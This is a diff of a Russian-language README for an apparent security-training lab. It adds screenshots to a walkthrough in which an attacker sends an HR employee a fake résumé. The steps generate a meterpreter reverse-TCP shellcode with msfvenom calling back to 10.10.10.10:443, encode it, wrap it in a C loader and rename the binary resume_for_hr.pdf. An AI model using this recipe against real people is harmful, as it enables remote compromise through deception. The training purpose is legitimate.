@@ -19,11 +19,22 @@ cyberpolygon for information security training
 
 “Здравствуйте еще раз! я заинтересован в вашей работе. Вот мое резюме” 
 Его впечатлил телефонный разговор и он бежит побыстрее посмотреть его резюме.
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-36-50.png)
+
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-09.png)
 
 Тем временем у атакующего включен meterpreter listener и он получает оболочку , тем самым имея возможность загрузить любые файлы и выполнить любой код. 
 
 Чем он и пользуется, закидывая hr-ру файлик hacked.txt , в котором сообщается, что тот взломан
+
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-19.png)
+
+Так выглядят Отработавшие скрипты HR:
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-34.png)
+
+и hacker:
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-41-47.png)
 
 ## Описание созданного вируса
 
@@ -39,16 +50,22 @@ cyberpolygon for information security training
 
 Сгенерируем 64-битный незакодированный шеллкод с помощью msfvenom с типом вывода «c» на Kali след. командой : 
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c 
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-42-24.png)
 
 Скопируем char buf[] и вставим это в программу encoder_beautiful.c
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-04.png)
 
 Скомпилируем командой gcc encoder_beautiful.c -o encoder_beautiful.elf
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-40.png)
 
 запустим ./encoder_beautiful.elf - теперь это надо скопировать
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-17.png)
 
 Затем мы вставим char buf[] в программу на C, которая будет действовать как оболочка для загрузки и запустит шеллкод.
+![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-04.png)
 
 Скомпилировать след. командой файл hack.c
+![Screenshot]
 
 Получен готовый вирус, который необходимо закинуть жертве. Попробуем переименовать его вместо hack.elf в resume_for_hr.pdf
 
